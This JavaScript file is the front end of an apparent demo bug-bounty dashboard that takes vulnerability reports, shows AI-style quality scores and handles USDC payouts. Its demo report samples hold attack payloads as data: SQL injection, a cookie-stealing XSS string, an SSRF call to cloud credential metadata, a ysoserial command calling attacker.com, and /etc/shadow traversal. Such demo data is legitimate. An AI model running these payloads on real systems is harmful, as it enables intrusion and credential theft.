const API = window.location.origin;
let programInitialized = false;
let currentFilter = "all";
let adminToken = "";
let treasuryAccounts = []; // all chain addresses from the treasury wallet

const CHAIN_ID_MAP = {
  evm: "eip155", solana: "solana", bitcoin: "bip122", tron: "tron", cosmos: "cosmos",
};

function getTreasuryAddress(chain) {
  const prefix = CHAIN_ID_MAP[chain] || chain;
  const account = treasuryAccounts.find(a => (a.chainId || "").startsWith(prefix));
  return account ? account.address : null;
}

function el(tag, attrs = {}, children = []) {
  const node = document.createElement(tag);
  for (const [k, v] of Object.entries(attrs)) {
    if (k === "textContent") node.textContent = v;
    else if (k === "className") node.className = v;
    else if (k === "style" && typeof v === "object") Object.assign(node.style, v);
    else if (k === "title") node.title = v;
    else if (k === "onclick") node.addEventListener("click", v);
    else node.setAttribute(k, v);
  }
  for (const child of children) {
    if (typeof child === "string") node.appendChild(document.createTextNode(child));
    else if (child) node.appendChild(child);
  }
  return node;
}

function text(str) { return document.createTextNode(str); }

async function init() {
  try {
    const res = await fetch(`${API}/api/bounty`);
    if (res.ok) {
      programInitialized = true;
      updateStats(await res.json());
      loadReports(true);
    }
  } catch {}

  if (!programInitialized) {
    try {
      const res = await fetch(`${API}/api/bounty/create`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name: "BountyBot Demo Program", maxPerBug: 150, dailyLimit: 500 }),
      });
      if (res.ok) {
        programInitialized = true;
        updateStats(await res.json());
      }
    } catch {}
  }
  connectSSE();
  setupAdminPanel();
}

let sseConnected = false;
let evtSource = null;
let sseReconnectDelay = 1000;
const SSE_MAX_DELAY = 30000;

function connectSSE() {
  if (evtSource) {
    evtSource.close();
    evtSource = null;
  }

  evtSource = new EventSource(`${API}/api/events`);

  evtSource.addEventListener("connected", () => {
    sseConnected = true;
    sseReconnectDelay = 1000;
  });

  evtSource.addEventListener("report_submitted", (e) => addFeedItem(JSON.parse(e.data)));
  evtSource.addEventListener("report_evaluated", (e) => { updateFeedItem(JSON.parse(e.data)); refreshStats(); });
  evtSource.addEventListener("payout_authorized", (e) => { const d = JSON.parse(e.data); updateFeedItem(d.report); refreshStats(); });
  evtSource.addEventListener("program_created", (e) => { updateStats(JSON.parse(e.data)); });
  evtSource.addEventListener("program_reset", () => { loadReports(); refreshStats(); });

  evtSource.onerror = () => {
    sseConnected = false;
    evtSource.close();
    evtSource = null;
    setTimeout(() => {
      connectSSE();
    }, sseReconnectDelay);
    sseReconnectDelay = Math.min(sseReconnectDelay * 2, SSE_MAX_DELAY);
  };
}

// Silent background sync — no visible countdown, just a tiny status dot
setInterval(() => {
  const dot = document.getElementById("statusDot");
  if (dot) dot.className = "status-dot " + (sseConnected ? "live" : evtSource === null ? "reconnecting" : "offline");
  refreshStats();
  if (!sseConnected) loadReports();
}, 15000);

// Reset
async function resetAll() {
  if (!confirm("Clear all reports and transactions? This cannot be undone.")) return;
  try {
    const res = await fetch(`${API}/api/reset`, { method: "POST" });
    if (res.ok) {
      knownStates.clear();
      loadReports(true);
      refreshStats();
    }
  } catch {}
}

function updateStats(data) {
  setText("totalAuthorized", `$${data.total_authorized ?? 0}`);
  setText("reportsCount", data.reports_count ?? 0);
  const dailyLimit = data.policy?.dailyLimit || 500;
  const spent = data.daily_spent ?? 0;
  setText("dailyRemaining", `$${Math.max(0, dailyLimit - spent)}`);
  setText("pendingCount", data.pending_review_count ?? 0);

  treasuryAccounts = data.wallet?.accounts || [];
  const walletEl = document.getElementById("walletAddr");
  const accounts = treasuryAccounts;
  if (walletEl && accounts.length > 0) {
    const primary = accounts.find(a => (a.chainId || "").includes("eip155")) || accounts[0];
    walletEl.textContent = `${primary.address.slice(0, 6)}...${primary.address.slice(-4)}`;
    walletEl.title = accounts.map(a => `${a.chainId.split(":")[0]}: ${a.address}`).join("\n");
  }
}

function setText(id, val) {
  const el = document.getElementById(id);
  if (el) el.textContent = val;
}

async function refreshStats() {
  try {
    const res = await fetch(`${API}/api/bounty`);
    if (res.ok) updateStats(await res.json());
  } catch {}
}

// Track known report states to avoid unnecessary DOM updates
const knownStates = new Map();

async function loadReports(forceRebuild = false) {
  try {
    const url = currentFilter === "all" ? `${API}/api/reports`
      : currentFilter === "duplicates" ? `${API}/api/reports?duplicates=1`
      : `${API}/api/reports?status=${currentFilter}`;
    const res = await fetch(url);
    if (!res.ok) return;
    const reports = await res.json();
    const feed = document.getElementById("feed");

    if (forceRebuild) {
      feed.textContent = "";
      knownStates.clear();
      if (reports.length === 0) {
        feed.appendChild(el("div", { className: "feed-empty" }, [el("p", { textContent: "No reports match this filter." })]));
      } else {
        reports.forEach(r => {
          knownStates.set(r.id, r.status);
          addFeedItem(r, false);
        });
      }
      return;
    }

    // Smart diff: only update items whose status changed or that are new
    const serverIds = new Set(reports.map(r => r.id));

    for (const r of reports) {
      const existing = document.getElementById(`report-${r.id}`);
      if (!existing) {
        // New item
        knownStates.set(r.id, r.status);
        addFeedItem(r, true);
      } else if (knownStates.get(r.id) !== r.status) {
        // Status changed — update quietly (no animation)
        knownStates.set(r.id, r.status);
        existing.replaceWith(buildFeedItem(r));
      }
    }

    // Remove items no longer in server response (e.g. after reset or filter change)
    for (const node of [...feed.querySelectorAll(".feed-item")]) {
      const id = node.id.replace("report-", "");
      if (!serverIds.has(id)) node.remove();
    }

    // Show empty state if needed
    const empty = feed.querySelector(".feed-empty");
    if (feed.querySelectorAll(".feed-item").length === 0 && !empty) {
      feed.appendChild(el("div", { className: "feed-empty" }, [el("p", { textContent: "No reports match this filter." })]));
    } else if (feed.querySelectorAll(".feed-item").length > 0 && empty) {
      empty.remove();
    }
  } catch {}
}

function addFeedItem(report, prepend = true) {
  if (!report || !report.id) return;
  // Skip if already in feed
  if (document.getElementById(`report-${report.id}`)) {
    updateFeedItem(report);
    return;
  }
  const feed = document.getElementById("feed");
  const empty = feed.querySelector(".feed-empty");
  if (empty) empty.remove();
  if (currentFilter === "duplicates" && !report.duplicate_of) return;
  if (currentFilter !== "all" && currentFilter !== "duplicates" && report.status !== currentFilter) return;
  knownStates.set(report.id, report.status);
  const item = buildFeedItem(report);
  if (prepend) feed.prepend(item); else feed.appendChild(item);
}

function updateFeedItem(report) {
  const existing = document.getElementById(`report-${report.id}`);
  if (existing) {
    const newItem = buildFeedItem(report);
    newItem.classList.add("updated");
    existing.replaceWith(newItem);
  } else {
    addFeedItem(report);
  }
}

function buildFeedItem(report) {
  const sevColors = { critical: "#ff5252", high: "#ffab40", medium: "#ffd740", low: "#8888a0" };
  const qs = report.quality_score ?? 0;
  const conf = report.confidence ?? 0;
  const qColor = qs >= 7 ? "#00e676" : qs >= 4 ? "#ffab40" : "#ff5252";
  const qPct = (qs / 10) * 100;
  const statusClass = (report.status || "").replace(/_/g, "-");

  const item = el("div", { className: `feed-item ${statusClass}`, id: `report-${report.id}` });

  // Click to expand/collapse detail
  item.addEventListener("click", async (e) => {
    if (e.target.closest(".review-btn") || e.target.closest("button")) return;
    const existing = item.querySelector(".report-detail");
    if (existing) { existing.remove(); return; }
    try {
      const res = await fetch(`${API}/api/report/${report.id}`);
      if (!res.ok) return;
      const detail = await res.json();
      const detailDiv = el("div", { className: "report-detail" });
      if (detail.description_preview) {
        detailDiv.appendChild(el("div", { className: "detail-section" }, [
          el("strong", { textContent: "Description: " }), text(detail.description_preview),
        ]));
      }
      if (detail.audit && detail.audit.length > 0) {
        detailDiv.appendChild(el("div", { className: "detail-section" }, [el("strong", { textContent: "Audit Trail:" })]));
        for (const a of detail.audit) {
          detailDiv.appendChild(el("div", { className: "audit-entry" }, [
            el("span", { className: "audit-action", textContent: a.action }),
            text(` · ${new Date(a.at).toLocaleTimeString()}`),
          ]));
        }
      }
      item.appendChild(detailDiv);
    } catch {}
  });

  item.appendChild(el("div", { className: "header" }, [
    el("span", { className: "title", textContent: report.title }),
    el("span", { className: `status ${statusClass}`, textContent: (report.status || "").replace(/_/g, " ") }),
  ]));

  const meta = el("div", { className: "meta" });
  meta.appendChild(el("span", { style: { color: sevColors[report.severity] || "#888" }, textContent: (report.severity || "").toUpperCase() }));
  meta.appendChild(text(` · ${report.id} · ${new Date(report.created_at).toLocaleTimeString()}`));
  if (report.vuln_class) meta.appendChild(el("span", { className: "tag", textContent: report.vuln_class }));
  if (report.affected_asset) meta.appendChild(el("span", { className: "tag asset", textContent: report.affected_asset }));
  item.appendChild(meta);

  if (qs > 0) {
    const barFill = el("div", { className: "bar-fill", style: { width: `${qPct}%`, background: qColor } });
    const barChildren = [
      el("span", { style: { fontSize: "11px", color: "var(--text-dim)" }, textContent: "Quality:" }),
      el("div", { className: "bar" }, [barFill]),
      el("span", { className: "score", style: { color: qColor }, textContent: `${qs}/10` }),
    ];
    if (conf > 0) barChildren.push(el("span", { style: { fontSize: "11px", color: "var(--text-dim)", marginLeft: "8px" }, textContent: `conf: ${Math.round(conf * 100)}%` }));
    item.appendChild(el("div", { className: "quality-bar" }, barChildren));
  }

  if (report.duplicate_of) {
    item.appendChild(el("div", { className: "duplicate-flag", textContent: `Possible duplicate of ${report.duplicate_of} (score: ${report.duplicate_score})` }));
  }

  if (report.reasoning) {
    item.appendChild(el("div", { className: "reasoning", textContent: report.reasoning }));
  }

  if (report.status === "signed" || report.status === "confirmed" || report.status === "broadcasted") {
    const ref = report.tx_hash || report.authorization_id || "pending";
    const refLabel = report.tx_hash ? "Tx" : "Auth";
    const refText = ref.length > 24 ? ref.slice(0, 24) + "..." : ref;
    const chain = (report.chain || "evm").toUpperCase();
    const isCrossChain = report.chain && report.chain !== "evm";
    const payoutChildren = [
      el("span", { className: "payout-amount", textContent: `$${report.payout} USDC` }),
      el("span", { className: "tag chain-tag", textContent: chain }),
    ];
    if (isCrossChain) {
      payoutChildren.push(el("span", { className: "tag bridge-tag", textContent: "cross-chain" }));
    }
    payoutChildren.push(el("span", { className: "tx-hash", textContent: `${refLabel}: ${refText}` }));
    item.appendChild(el("div", { className: "payout-info" }, payoutChildren));

    // Show treasury address for this chain
    const treasuryAddr = getTreasuryAddress(report.chain);
    if (treasuryAddr) {
      const short = treasuryAddr.slice(0, 10) + "..." + treasuryAddr.slice(-6);
      item.appendChild(el("div", { className: "treasury-from", title: treasuryAddr, textContent: `From treasury: ${short}` }));
    }
  }

  if ((report.status === "pending_review" || report.status === "probable_duplicate") && adminToken) {
    const actions = el("div", { className: "review-actions" });
    actions.appendChild(el("span", { style: { fontSize: "11px", color: "var(--orange)" }, textContent: `Awaiting ${report.review_level || "manual"} review` }));

    const btnRow = el("div", { className: "review-btn-row" });

    const approveBtn = el("button", { className: "review-btn approve", textContent: "Approve" });
    approveBtn.addEventListener("click", async (e) => {
      e.stopPropagation();
      approveBtn.disabled = true;
      try {
        const res = await fetch(`${API}/api/report/${report.id}/review`, {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-admin-token": adminToken },
          body: JSON.stringify({ action: "approve", reviewedBy: "admin" }),
        });
        const json = await res.json();
        if (!res.ok) {
          showToast(json.error || "Approval failed", "warning");
        } else {
          updateFeedItem(json);
          refreshStats();
          showToast(`Approved: $${json.payout} USDC`, "success");
        }
      } catch { showToast("Network error", "warning"); }
      approveBtn.disabled = false;
    });

    const rejectBtn = el("button", { className: "review-btn reject", textContent: "Reject" });
    rejectBtn.addEventListener("click", async (e) => {
      e.stopPropagation();
      const reason = prompt("Rejection reason:");
      if (!reason) return;
      rejectBtn.disabled = true;
      try {
        const res = await fetch(`${API}/api/report/${report.id}/review`, {
          method: "POST",
          headers: { "Content-Type": "application/json", "x-admin-token": adminToken },
          body: JSON.stringify({ action: "reject", reviewedBy: "admin", reason }),
        });
        const json = await res.json();
        if (!res.ok) {
          showToast(json.error || "Rejection failed", "warning");
        } else {
          updateFeedItem(json);
          refreshStats();
          showToast("Report rejected", "info");
        }
      } catch { showToast("Network error", "warning"); }
      rejectBtn.disabled = false;
    });

    btnRow.appendChild(approveBtn);
    btnRow.appendChild(rejectBtn);
    actions.appendChild(btnRow);
    item.appendChild(actions);
  } else if (report.status === "pending_review" || report.status === "probable_duplicate") {
    item.appendChild(el("div", { className: "review-actions" }, [
      el("span", { style: { fontSize: "11px", color: "var(--orange)" }, textContent: `Awaiting ${report.review_level || "manual"} review` }),
    ]));
  }

  return item;
}

function setFilter(filter) {
  currentFilter = filter;
  document.querySelectorAll(".filter-btn").forEach(btn => {
    btn.classList.toggle("active", btn.dataset.filter === filter);
  });
  loadReports(true); // force rebuild on filter change
}

function showToast(message, type = "info") {
  let container = document.getElementById("toastContainer");
  if (!container) {
    container = el("div", { id: "toastContainer", className: "toast-container" });
    document.body.appendChild(container);
  }
  const toast = el("div", { className: `toast toast-${type}`, textContent: message });
  container.appendChild(toast);
  setTimeout(() => { toast.classList.add("toast-exit"); setTimeout(() => toast.remove(), 300); }, 4000);
}

function setupAdminPanel() {
  const header = document.querySelector(".feed-header-right");

  const adminBtn = el("button", { className: "admin-toggle-btn", textContent: "Admin" });
  header.insertBefore(adminBtn, header.firstChild);

  adminBtn.addEventListener("click", () => {
    const current = adminToken;
    const token = prompt("Enter admin token (leave empty to exit admin mode):", current);
    if (token === null) return;
    adminToken = token.trim();
    adminBtn.classList.toggle("active", !!adminToken);
    loadReports(true);
  });
}

document.getElementById("reportForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const btn = document.getElementById("submitBtn");
  const msgEl = document.getElementById("formMessage");
  btn.disabled = true;
  btn.querySelector(".btn-text").style.display = "none";
  btn.querySelector(".btn-loading").style.display = "inline";
  msgEl.hidden = true;

  const data = {
    title: document.getElementById("bugTitle").value,
    severity: document.querySelector('input[name="severity"]:checked').value,
    description: document.getElementById("bugDescription").value,
    reporterWallet: document.getElementById("reporterWallet").value,
    chain: document.getElementById("chainSelect").value,
  };

  try {
    const res = await fetch(`${API}/api/report/submit`, {
      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data),
    });
    const json = await res.json();
    if (!res.ok) {
      msgEl.textContent = json.error || "Submission failed.";
      msgEl.className = "form-message error";
      msgEl.hidden = false;
    } else {
      addFeedItem(json);
      refreshStats();
      showToast(`Report submitted: ${json.status}`, json.status === "rejected" ? "warning" : "success");
      document.getElementById("reportForm").reset();
      document.querySelector('input[name="severity"][value="high"]').checked = true;
      updateCharCounter();
    }
  } catch (err) {
    msgEl.textContent = "Network error. Try again.";
    msgEl.className = "form-message error";
    msgEl.hidden = false;
  }

  btn.disabled = false;
  btn.querySelector(".btn-text").style.display = "inline";
  btn.querySelector(".btn-loading").style.display = "none";
});

// Demo report pools — picks a random one each click
const GOOD_REPORTS = [
  {
    title: "SQL Injection in /api/users search endpoint",
    severity: "critical",
    description: "Steps to reproduce:\n1. Navigate to /api/users?search=test\n2. Inject payload: /api/users?search=test' OR '1'='1' --\n3. The query returns all users in the database\n\nImpact: Full database read access. An attacker can extract all user credentials, PII, and payment information.\n\nProof of Concept:\ncurl \"https://app.example.com/api/users?search=test%27%20OR%20%271%27%3D%271%27%20--\"\n\nThe vulnerable code is at line 142 in src/controllers/users.js.\nRecommended fix: Use parameterized queries with prepared statements.",
    wallet: "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD38",
  },
  {
    title: "Stored XSS via profile bio field",
    severity: "critical",
    description: "Steps to reproduce:\n1. Go to /settings/profile\n2. In the Bio field, enter: <img src=x onerror=alert(document.cookie)>\n3. Save profile and visit /user/attacker\n4. JavaScript executes in the victim's browser\n\nImpact: Session hijacking, credential theft, phishing via injected content. Any user viewing the attacker's profile has their session token stolen.\n\nProof of Concept: The payload above triggers an alert. A real attack would exfiltrate cookies to an external server.\n\nAffected endpoint: POST /api/profile/update\nRoot cause: Bio field is rendered without HTML sanitization.\n\nRecommended fix: Use DOMPurify or escape HTML entities before rendering user content.",
    wallet: "0xA1B2C3D4E5F60718293a4b5c6d7e8f9001234567",
  },
  {
    title: "IDOR allows accessing other users' payment history",
    severity: "high",
    description: "Steps to reproduce:\n1. Log in as user A (id=100)\n2. Send GET /api/payments?userId=101\n3. The API returns user B's full payment history including amounts, dates, and card last-4\n\nImpact: Any authenticated user can view any other user's payment history. This exposes financial PII for all users.\n\nProof of Concept:\ncurl -H \"Authorization: Bearer <token_A>\" \"https://app.example.com/api/payments?userId=101\"\n\nThe server does not verify that the requesting user owns the requested userId.\n\nRecommended fix: Add authorization check: if (req.user.id !== req.query.userId) return 403.",
    wallet: "0xFEDCBA9876543210fedcba9876543210FEDCBA98",
  },
  {
    title: "SSRF in webhook URL validation allows internal network scanning",
    severity: "critical",
    description: "Steps to reproduce:\n1. Go to /settings/webhooks\n2. Add a new webhook with URL: http://169.254.169.254/latest/meta-data/\n3. Save and trigger the webhook\n4. The server fetches the AWS metadata endpoint and returns instance credentials\n\nImpact: Full AWS credential theft via SSRF. Attacker gains IAM role credentials, can pivot to S3, RDS, and other AWS services.\n\nProof of Concept:\ncurl -X POST /api/webhooks -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'\n\nRoot cause: No URL validation against internal/metadata IPs.\n\nRecommended fix: Block RFC1918 ranges, link-local (169.254.x.x), and cloud metadata IPs.",
    wallet: "0x1111222233334444555566667777888899990000",
  },
  {
    title: "Authentication bypass via JWT algorithm confusion",
    severity: "critical",
    description: "Steps to reproduce:\n1. Capture a valid JWT from the login response\n2. Decode the header and change alg from RS256 to HS256\n3. Sign the modified token using the server's public key as the HMAC secret\n4. Send requests with the forged token\n5. The server accepts it as valid\n\nImpact: Complete authentication bypass. Any user can forge admin tokens.\n\nProof of Concept:\npython3 jwt_tool.py <token> -X a -pk public.pem\n\nThe server's JWT library accepts both RS256 and HS256 without pinning the algorithm.\n\nRecommended fix: Pin the algorithm in verification: jwt.verify(token, key, { algorithms: ['RS256'] })",
    wallet: "0xAABBCCDDEEFF00112233445566778899AABBCCDD",
  },
  {
    title: "Remote Code Execution via unsafe deserialization in /api/import",
    severity: "critical",
    description: "Steps to reproduce:\n1. Craft a malicious serialized Java object using ysoserial\n2. POST it to /api/import with Content-Type: application/x-java-serialized-object\n3. The server deserializes the payload and executes arbitrary commands\n\nImpact: Full server compromise. Attacker can execute arbitrary system commands.\n\nProof of Concept:\njava -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/pwned' | base64\ncurl -X POST /api/import -d @payload.bin\n\nAffected version: 2.3.1 (uses commons-collections 3.2.1)\nRoot cause: ObjectInputStream.readObject() on untrusted input.\n\nRecommended fix: Use a whitelist-based deserialization filter or switch to JSON.",
    wallet: "0x5566778899AABBCCDDEEFF0011223344556677FF",
  },
  {
    title: "Path traversal in file download endpoint",
    severity: "high",
    description: "Steps to reproduce:\n1. Send GET /api/files/download?path=../../etc/passwd\n2. The server returns the contents of /etc/passwd\n3. Any file readable by the server process can be downloaded\n\nImpact: Arbitrary file read. Attacker can access config files with database credentials, API keys, and private keys.\n\nProof of Concept:\ncurl \"https://app.example.com/api/files/download?path=../../../etc/shadow\"\n\nAffected endpoint: GET /api/files/download\nRoot cause: Path parameter passed directly to fs.readFile without sanitization.\n\nRecommended fix: Use path.resolve and verify the resolved path is within the allowed directory.",
    wallet: "7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV",
  },
  {
    title: "Information disclosure via debug endpoint",
    severity: "medium",
    description: "Steps to reproduce:\n1. Send GET /debug/vars\n2. The server returns all environment variables including:\n   - DATABASE_URL with username and password\n   - AWS_SECRET_ACCESS_KEY\n   - JWT_SECRET\n\nImpact: Full credential disclosure. Attacker gains access to all external services.\n\nAffected endpoint: GET /debug/vars\nThis endpoint is accessible without authentication in production.\n\nRecommended fix: Remove debug endpoints in production or gate them behind authentication.",
    wallet: "TN2YqTv5rFcGBzSJMWFQsdwUY9dp31AQLF",
  },
];

const MEDIUM_REPORTS = [
  {
    title: "Open redirect in /auth/callback allows phishing",
    severity: "medium",
    description: "Steps to reproduce:\n1. Visit: https://app.example.com/auth/callback?redirect=https://evil.com/fake-login\n2. After OAuth login, user is redirected to the attacker's site\n3. Attacker's page mimics the login page and steals credentials\n\nImpact: Phishing attacks using the trusted domain.\n\nAffected endpoint: GET /auth/callback\nThe redirect parameter is not validated against a whitelist.\n\nRecommended fix: Validate redirect URL against allowed origins, or only allow relative paths.",
    wallet: "0x3344556677889900AABBCCDDEEFF001122334455",
  },
  {
    title: "Rate limiting bypass via X-Forwarded-For header spoofing",
    severity: "medium",
    description: "Steps to reproduce:\n1. Send POST /api/login with invalid credentials (rate limited after 5 attempts)\n2. Add header: X-Forwarded-For: 1.2.3.4\n3. Rate limit resets, attacker can continue brute-forcing\n4. Cycle through random IPs to bypass entirely\n\nImpact: Credential brute-force attacks against any user account.\n\nAffected endpoint: POST /api/login\n\nRecommended fix: Trust X-Forwarded-For only from known proxy IPs.",
    wallet: "0xABCDEF0123456789ABCDEF0123456789ABCDEF01",
  },
  {
    title: "Sensitive data exposure in error stack traces",
    severity: "medium",
    description: "Steps to reproduce:\n1. Send a malformed request to POST /api/checkout with invalid JSON\n2. Server returns 500 with full stack trace including:\n   - Database connection string with credentials\n   - Internal file paths\n   - Node.js version and dependency versions\n\nImpact: Information disclosure useful for targeted attacks.\n\nAffected endpoint: All endpoints (global error handler leaks details)\n\nRecommended fix: Set NODE_ENV=production, use a custom error handler that returns generic messages.",
    wallet: "0x9988776655443322110099887766554433221100",
  },
  {
    title: "CSRF on account email change endpoint",
    severity: "high",
    description: "Steps to reproduce:\n1. Victim is logged into app.example.com\n2. Victim visits attacker's page with a hidden form that POSTs to /api/account/email\n3. Victim's email is changed to attacker@evil.com\n4. Attacker triggers password reset and takes over the account\n\nImpact: Full account takeover via CSRF + password reset chain.\n\nAffected endpoint: POST /api/account/email\nNo CSRF token or re-authentication required.\n\nRecommended fix: Add CSRF tokens or require current password for email changes.",
    wallet: "0x1234ABCD5678EFAB1234ABCD5678EFAB1234ABCD",
  },
  {
    title: "Privilege escalation via role parameter in registration",
    severity: "high",
    description: "Steps to reproduce:\n1. Intercept the POST /api/register request\n2. Add role=admin to the request body\n3. The new account is created with admin privileges\n\nImpact: Any user can self-escalate to admin during registration.\n\nProof of Concept:\ncurl -X POST /api/register -d '{\"email\":\"attacker@evil.com\",\"password\":\"test\",\"role\":\"admin\"}'\n\nRoot cause: Mass assignment - the registration endpoint copies all request fields to the user model.\n\nRecommended fix: Whitelist allowed fields: only accept email, password, name. Ignore role.",
    wallet: "0xAAAABBBBCCCCDDDDEEEEFFFF0000111122223333",
  },
];

const BAD_REPORTS = [
  {
    title: "something might be broken",
    severity: "low",
    description: "I'm not sure but maybe the site is slow sometimes. Could be a bug?",
    wallet: "0xDEADBEEF000000000000000000000000DeAdBeEf",
  },
  {
    title: "website looks weird",
    severity: "low",
    description: "the colors are off on mobile, not sure if this is a security thing",
    wallet: "0x1234567890AbcdEF1234567890aBcDEF12345678",
  },
  {
    title: "error message",
    severity: "medium",
    description: "i got an error once but didnt screenshot it. maybe you should look into it?",
    wallet: "0xABCDEF1234567890abcdef1234567890AbCdEf12",
  },
  {
    title: "your site might have bugs",
    severity: "high",
    description: "heard from a friend that sites like yours usually have vulnerabilities. you should probably check things.",
    wallet: "0x9876543210FeDcBa9876543210fEdCbA98765432",
  },
  {
    title: "placeholder test report",
    severity: "low",
    description: "testing 123. this is a test. just checking if the form works.",
    wallet: "0xDeadBeef00000000000000000000000012345678",
  },
];

function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

function fillForm(r) {
  document.getElementById("bugTitle").value = r.title;
  document.querySelector('input[name="severity"][value="' + r.severity + '"]').checked = true;
  document.getElementById("bugDescription").value = r.description;
  document.getElementById("reporterWallet").value = r.wallet;
}

function fillGoodReport() { fillForm(pick(GOOD_REPORTS)); }
function fillMediumReport() { fillForm(pick(MEDIUM_REPORTS)); }
function fillBadReport() { fillForm(pick(BAD_REPORTS)); }
function fillRandomReport() { fillForm(pick([...GOOD_REPORTS, ...MEDIUM_REPORTS, ...BAD_REPORTS])); }

// Auto-detect chain from wallet address
const CHAIN_DETECT = [
  { pattern: /^0x[0-9a-fA-F]{40}$/, chain: "evm", label: "EVM" },
  { pattern: /^T[1-9A-HJ-NP-Za-km-z]{33}$/, chain: "tron", label: "Tron" },
  { pattern: /^(bc1[a-zA-HJ-NP-Z0-9]{25,87}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/, chain: "bitcoin", label: "Bitcoin" },
  { pattern: /^cosmos1[a-z0-9]{38}$/, chain: "cosmos", label: "Cosmos" },
  { pattern: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/, chain: "solana", label: "Solana" },
];

function detectChain(address) {
  for (const { pattern, chain, label } of CHAIN_DETECT) {
    if (pattern.test(address)) return { chain, label };
  }
  return null;
}

document.getElementById("reporterWallet").addEventListener("input", () => {
  const addr = document.getElementById("reporterWallet").value.trim();
  const chainSelect = document.getElementById("chainSelect");
  const detected = document.getElementById("detectedChain");
  if (chainSelect.value === "auto" && addr.length > 10) {
    const result = detectChain(addr);
    if (result) {
      detected.textContent = "Detected: " + result.label;
    } else {
      detected.textContent = "";
    }
  } else {
    detected.textContent = "";
  }
});

// Character counter for description
function updateCharCounter() {
  const desc = document.getElementById("bugDescription");
  const counter = document.getElementById("charCounter");
  if (desc && counter) {
    const len = desc.value.length;
    counter.textContent = `${len} / 5000`;
    counter.style.color = len > 4500 ? "var(--red)" : len > 3000 ? "var(--orange)" : "var(--text-dim)";
  }
}
document.getElementById("bugDescription").addEventListener("input", updateCharCounter);

// Bind buttons (no inline onclick — CSP blocks them)
document.getElementById("demoGood").addEventListener("click", fillGoodReport);
document.getElementById("demoMedium").addEventListener("click", fillMediumReport);
document.getElementById("demoBad").addEventListener("click", fillBadReport);
document.getElementById("demoRandom").addEventListener("click", fillRandomReport);
document.getElementById("resetBtn").addEventListener("click", resetAll);
document.querySelectorAll(".filter-btn").forEach(btn => {
  btn.addEventListener("click", () => setFilter(btn.dataset.filter));
});

init();
